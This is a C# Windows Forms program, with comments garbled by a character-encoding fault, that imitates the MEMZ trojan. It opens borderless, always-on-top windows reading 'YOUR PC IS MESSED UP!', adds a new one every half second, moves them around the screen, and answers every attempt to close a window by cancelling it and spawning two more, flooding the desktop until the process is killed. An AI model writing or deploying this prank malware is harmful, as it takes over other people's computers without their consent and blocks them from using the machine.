using System;
using System.Collections.Generic;
using System.Drawing;
using System.Windows.Forms;

class Program
{
    static List<MovingWindow> windows = new List<MovingWindow>(); // �s�x�Ҧ�����
    static Random random = new Random();

    [STAThread]
    public static void Main()
    {
        // ��l�Ы� 5 �ӵ���
        for (int i = 0; i < 5; i++)
        {
            CreateMovingWindow();
        }

        // �w�ɾ��G�C 500 �@��ͦ��@�ӷs����
        System.Windows.Forms.Timer addWindowTimer = new System.Windows.Forms.Timer
        {
            Interval = 500 // �C 500 �@��s�W�@�ӵ���
        };
        addWindowTimer.Tick += (sender, e) => CreateMovingWindow();
        addWindowTimer.Start();

        Application.Run(); // �O�����ε{���B��
    }

    public static void CreateMovingWindow()
    {
        MovingWindow movingWindow = new MovingWindow();
        windows.Add(movingWindow);
        movingWindow.Show();
    }
}

class MovingWindow : Form
{
    private System.Windows.Forms.Timer animationTimer; // ����Ʋ��ʪ��p�ɾ�
    private Point targetPosition; // �ؼЦ�m
    private Random random = new Random();

    public MovingWindow()
    {
        // �����ݩ�
        Text = "MEMZ";
        Size = new Size(300, 150);
        StartPosition = FormStartPosition.Manual;
        FormBorderStyle = FormBorderStyle.None; // �L���
        BackColor = Color.FromArgb(random.Next(256), random.Next(256), random.Next(256)); // �H���I���C��
        TopMost = true; // ��ܦb�̤W�h

        // �K�[����
        Label label = new Label
        {
            Text = "YOUR PC IS MESSED UP!",
            ForeColor = Color.White,
            BackColor = Color.Transparent,
            AutoSize = true,
            Font = new Font("Arial", 12, FontStyle.Bold),
            Location = new Point(50, 50) // �վ��r��m
        };
        Controls.Add(label);

        // �]�m��l��m
        int screenWidth = Screen.PrimaryScreen.Bounds.Width;
        int screenHeight = Screen.PrimaryScreen.Bounds.Height;
        Location = new Point(random.Next(0, screenWidth - Width), random.Next(0, screenHeight - Height));

        // �]�w�ؼЦ�m
        SetRandomTargetPosition();

        // �]�m���Ʋ��ʪ��p�ɾ�
        animationTimer = new System.Windows.Forms.Timer
        {
            Interval = 20 // �C 20 �@���s�@����m
        };
        animationTimer.Tick += AnimateMovement;
        animationTimer.Start();

        // ���U FormClosing �ƥ�
        this.FormClosing += PreventClosing;
    }

    private void SetRandomTargetPosition()
    {
        int screenWidth = Screen.PrimaryScreen.Bounds.Width;
        int screenHeight = Screen.PrimaryScreen.Bounds.Height;
        targetPosition = new Point(random.Next(0, screenWidth - Width), random.Next(0, screenHeight - Height));
    }

    private void AnimateMovement(object? sender, EventArgs e)
    {
        // �p��s��m�A�v�B����ؼЦ�m
        int newX = Location.X + (targetPosition.X - Location.X) / 10;
        int newY = Location.Y + (targetPosition.Y - Location.Y) / 10;

        Location = new Point(newX, newY);

        // �p�G����ؼЦ�m�A�]�m�s���ؼЦ�m
        if (Math.Abs(Location.X - targetPosition.X) < 5 && Math.Abs(Location.Y - targetPosition.Y) < 5)
        {
            SetRandomTargetPosition();
        }
    }

    private void PreventClosing(object? sender, FormClosingEventArgs e)
    {
        e.Cancel = true; // ��������Q����

        // �Ыب�ӷs����
        for (int i = 0; i < 2; i++)
        {
            Program.CreateMovingWindow();
        }
    }
}
